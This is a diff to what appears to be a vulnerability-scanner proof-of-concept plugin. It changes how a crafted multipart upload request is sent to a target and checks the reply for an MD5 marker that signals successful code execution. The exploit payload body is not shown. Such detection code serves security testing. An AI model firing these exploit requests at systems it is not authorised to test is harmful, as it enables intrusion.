@@ -44,13 +44,14 @@ class Poc(ABPoc):
             payload += '-----------------------------108989518220095255551617421026—\r\n'
             payload_len = len(payload)
             
-            head = "Content-Type: multipart/form-data; boundary=---------------------------108989518220095255551617421026\r\n"
-            head += "Connection: Close\r\n"
-            head += "Content-Length: %d" % payload_len + '\r\n\r\n'
-            
+            head = {
+                "Content-Type": "multipart/form-data; boundary=---------------------------108989518220095255551617421026",
+                "Connection": "Close",
+                "Content-Length":str(payload_len)
+            }
             url = url = arg + path
-            code, head, res, errcode, _ = hh.http('-H \'%s\' -d \'%s\' %s' % (head, payload, url))
-            if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
+            req = requests.post(url, data=payload, headers=head)
+            if req.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
